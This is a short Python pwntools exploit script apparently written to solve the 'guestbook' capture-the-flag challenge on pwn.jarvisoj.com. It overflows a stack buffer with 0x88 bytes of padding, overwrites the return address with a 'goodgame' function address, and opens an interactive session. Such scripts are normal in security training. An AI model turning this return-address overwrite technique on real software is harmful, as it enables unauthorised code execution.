#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'
from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
    p = process('./guestbook.d3d5869bd6fb04dd35b29c67426c0f05')
else:
    p = remote('127.0.0.1',6666)
    p = remote('pwn.jarvisoj.com',9876)

elf = ELF('./guestbook.d3d5869bd6fb04dd35b29c67426c0f05')
stack_overflow = 0x88

goodgame_addr = 0x400620

payload = 'a' * stack_overflow + p64(goodgame_addr)
p.send(payload)
p.interactive()
